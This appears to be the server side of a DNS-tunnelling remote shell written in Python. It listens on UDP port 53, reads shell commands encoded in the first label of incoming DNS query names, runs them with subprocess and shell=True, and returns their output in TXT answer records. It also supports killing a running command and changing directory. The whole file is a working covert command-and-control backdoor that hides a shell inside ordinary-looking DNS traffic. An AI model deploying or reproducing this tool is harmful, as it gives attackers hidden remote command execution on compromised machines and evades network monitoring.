#!/usr/bin/python3

import sys
import os
import socket
import subprocess
from message import *
from process import Process

"""
splitRR split a string into an array of RR with the type t and a size of size bytes
and the ending sequence of our protocol (0000)
"""

def splitRR(string,t,size):
    a = []
    character_string = []
    
    for i in range(0,len(string),size): # Split into 255 char string
        s = string[i:i+size]
        
        if(s[len(s)-1:] == b'\x00'):
            s2 = (len(s) - 1).to_bytes(1,'big')
        else:
            s2 = len(s).to_bytes(1,'big') # Add the length of the string at the begining
            
        a.append(RR("",s2+s, t, 1, 0))

    return a

"""
Remove the salt at the begining of a command
return the command without the salt
"""

def removeSalt(s):
    i = 0
            
    while(s[i] >= "0" and s[i] <= "9"):
        i += 1

    return s[i:]

"""
run a shell command in a subprocess
return the process created
"""

def runCmd(cmd):
            
    if("cd" in cmd): # cd is a built-in command so we can't use subprocess
        path = cmd.split(' ')

        if(len(path) > 2):
            path = path[1]
        else:
            path = "/root/"
        
        os.chdir(path)
        cmd = "pwd" # Send the new path
        
    return Process(subprocess.Popen(cmd,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    shell=True)) # Run command in a subprocess

def main():
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    if(len(sys.argv) == 2):
        serversocket.bind((sys.argv[1], 53))
    else:
        print("No ip adress found, socket bind on 127.0.0.1")
        serversocket.bind(("127.0.0.1",53))

    last = ""
    p = None
    type_RR = 16
    nb_bytes = 255
    answer_array = []
    answer,ns,additional = [],[],[]
    # default_RR = { 1:(RR("",b'\x01\x01\x01\x01',1,1,1),
    #                   [],
    #                   [])
    #                2:(RR("",b'\x01\x01\x01\x01',1,1,1),
    #                   RR("",b'salut.devtoplay.com',2,1,1),
    #                   RR("salut.devtoplay.com",b'\x02\x02\x02\x02',1,1,1)
    
    while True:
        data, ad = serversocket.recvfrom(4096)
        #print(data)
        q = bytesToMessage(data)

        cmd = q.qList[0].qname.split(".")
        
        if(cmd[0] != "devtoplay" and q.qList[0].qtype == type_RR):
            if(last != cmd[0] and p is None and len(answer_array) == 0):
                cmd[0] = cmd[0].replace("\x07",".") # . can't be in the domain name, so we replace them with '\x07'
                p = runCmd(removeSalt(cmd[0]))
                

        if "SIGINT" in cmd[0]: # Interrupt the process	 
            if(p is not None and not p.endProcess): # Kill the process
                p.kill()

            answer_array = []
            p = None
	    
        if(p is not None and not p.end): # If there is still something to read
            out = p.readstream() # Read the output of the process
            answer_array += splitRR(out,type_RR,nb_bytes) # Convert it into an array of RR
        else:
            p = None

        
        if(cmd[0] != last):	       
            if(len(answer_array) > 0): # Send the output of the command
                answer = [answer_array.pop(0)]
                answer[0].name = q.qList[0].qname
                if(answer[0].rdata == b''):
                    answer = []
            else: # Send default answer
                answer = []
       
        message = Message(
	    Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, len(answer), len(ns), len(additional)),
	    [Question(q.qList[0].qname,q.qList[0].qtype)],
	    answer+ns+additional)

        last = cmd[0]

        #print(message)
        #print(message.getBytes())

        serversocket.sendto(message.getBytes(), ad)
        print("end")
        
        
if(__name__ == "__main__"):
    main()
